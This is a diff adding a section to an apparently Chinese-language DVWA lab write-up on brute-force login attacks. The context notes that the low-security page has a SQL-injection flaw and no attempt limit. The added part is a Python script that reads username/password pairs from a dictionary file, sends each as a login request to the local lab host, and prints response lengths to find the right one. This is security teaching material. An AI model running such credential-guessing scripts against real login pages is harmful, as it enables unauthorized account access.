@@ -103,3 +103,41 @@ payload set中选择2，设置password的字典。按照sniper中的方式设置
 
 这个页面的源码地址 `DVWA/vulnerabilities/brute/source/low.php`，分析源码，这是一个典型的万能密码（存在sql注入漏洞）。这个页面没有对输入次数进行限制，即错误一定次数后，XX秒等到，所以使得攻击者可以不断利用暴力破解的方式去寻找正确的密码。
 
+
+
+## python爬虫实现字典攻击
+
+```python
+import requests
+
+header = {
+    'Host': 'dvwa.localhost',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Upgrade-Insecure-Requests': '1',
+    'Accept-Language': 'zh-cn',
+    'Connection': 'keep-alive',
+    'Cookie': 'PHPSESSID=vbj4g725p9d0aulhe02s1gm417; security=low',
+    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
+}
+
+with open('dic.txt') as f:
+    i = 0;
+    for item in f.readlines():
+        pos = item.rfind(",")
+        username = item[:pos]
+        password = item[pos + 1:]
+        url = "http://dvwa.localhost/vulnerabilities/brute/" + "?username=" + username.strip() + \
+                     "&password=" + password.strip() + "&Login=Login"
+        rep = requests.get(url, headers=header)
+        print(i,username.strip(), password.strip(),len(rep.text))
+        i = i + 1
+```
+
+字典的内容为：
+
+![low_python_dic](image/low_python_dic.png)
+
+返回值：
+
+![low_python_result](image/low_python_result.png)
